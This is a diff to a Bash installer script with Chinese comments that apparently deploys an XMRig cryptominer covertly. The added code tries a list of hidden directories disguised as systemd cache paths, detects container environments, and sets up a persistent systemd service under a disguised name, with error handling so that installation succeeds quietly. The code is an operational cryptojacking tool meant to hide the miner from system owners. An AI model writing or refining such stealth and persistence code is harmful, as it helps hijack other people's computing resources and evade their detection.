@@ -71,17 +71,68 @@ get_disguise_name() {
 create_hidden_dirs() {
     log_info "创建隐藏安装目录..."
     
-    # 使用深层系统目录
-    WORK_DIR="/usr/lib/systemd/system-generators/.cache/systemd-update-utmp"
+    # 定义多个备用目录，按优先级排序
+    local candidate_dirs=(
+        "/usr/lib/systemd/system-generators/.cache/systemd-update-utmp"
+        "/tmp/.systemd-private-$(whoami)/tmp"
+        "/tmp/.cache-$(whoami)"
+        "/var/tmp/.systemd-$(whoami)"
+        "$HOME/.cache/systemd-update"
+        "$HOME/.local/share/systemd"
+        "/tmp/xmrig-$(whoami)-$$"
+    )
     
-    # 创建目录结构
-    mkdir -p "$WORK_DIR"
+    # 在容器环境中，优先使用用户可写的目录
+    if [[ "$IS_CONTAINER" == "true" ]]; then
+        candidate_dirs=(
+            "/tmp/.cache-$(whoami)"
+            "/tmp/xmrig-$(whoami)-$$"
+            "$HOME/.cache/systemd-update"
+            "$HOME/.local/share/systemd"
+            "/var/tmp/.systemd-$(whoami)"
+            "/tmp/.systemd-private-$(whoami)/tmp"
+            "/usr/lib/systemd/system-generators/.cache/systemd-update-utmp"
+        )
+        log_info "容器环境检测到，使用容器友好的目录结构"
+    fi
     
-    # 设置目录权限
-    chmod 755 "$WORK_DIR"
-    chmod 755 "/usr/lib/systemd/system-generators/.cache"
+    WORK_DIR=""
     
-    log_info "工作目录: $WORK_DIR"
+    # 尝试创建目录
+    for dir in "${candidate_dirs[@]}"; do
+        log_debug "尝试创建目录: $dir"
+        
+        if mkdir -p "$dir" 2>/dev/null; then
+            # 测试目录是否可写
+            if touch "$dir/.test" 2>/dev/null; then
+                rm -f "$dir/.test" 2>/dev/null
+                WORK_DIR="$dir"
+                log_info "成功创建工作目录: $WORK_DIR"
+                break
+            else
+                log_debug "目录创建成功但不可写: $dir"
+                rmdir "$dir" 2>/dev/null || true
+            fi
+        else
+            log_debug "无法创建目录: $dir"
+        fi
+    done
+    
+    # 如果所有目录都创建失败，使用当前目录
+    if [ -z "$WORK_DIR" ]; then
+        WORK_DIR="$(pwd)/.xmrig-$(whoami)-$$"
+        log_warn "所有预设目录创建失败，使用当前目录: $WORK_DIR"
+        
+        if ! mkdir -p "$WORK_DIR" 2>/dev/null; then
+            log_error "无法创建工作目录，请检查权限"
+            exit 1
+        fi
+    fi
+    
+    # 设置目录权限（忽略失败）
+    chmod 755 "$WORK_DIR" 2>/dev/null || true
+    
+    log_info "最终工作目录: $WORK_DIR"
 }
 
 # 检查参数
@@ -1030,7 +1081,20 @@ EOF
 
 # 创建systemd服务
 create_systemd_service() {
+    # 在容器环境中跳过systemd服务创建
+    if [ "$IS_CONTAINER" = true ]; then
+        log_info "容器环境检测到，跳过systemd服务创建"
+        return 0
+    fi
+    
     log_info "创建systemd服务..."
+    
+    # 检查是否有写入权限
+    if ! touch /etc/systemd/system/.test 2>/dev/null; then
+        log_warn "无法写入systemd目录，跳过服务创建"
+        return 1
+    fi
+    rm -f /etc/systemd/system/.test 2>/dev/null
     
     cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
 [Unit]
@@ -1053,12 +1117,19 @@ WantedBy=multi-user.target
 EOF
     
     # 重新加载systemd配置
-    systemctl daemon-reload
+    if ! systemctl daemon-reload 2>/dev/null; then
+        log_warn "systemctl daemon-reload失败"
+        return 1
+    fi
     
     # 启用服务
-    systemctl enable ${SERVICE_NAME}.service
+    if ! systemctl enable ${SERVICE_NAME}.service 2>/dev/null; then
+        log_warn "systemctl enable失败"
+        return 1
+    fi
     
     log_info "systemd服务创建完成"
+    return 0
 }
 
 # 创建SysV init脚本（用于不支持systemd的系统）
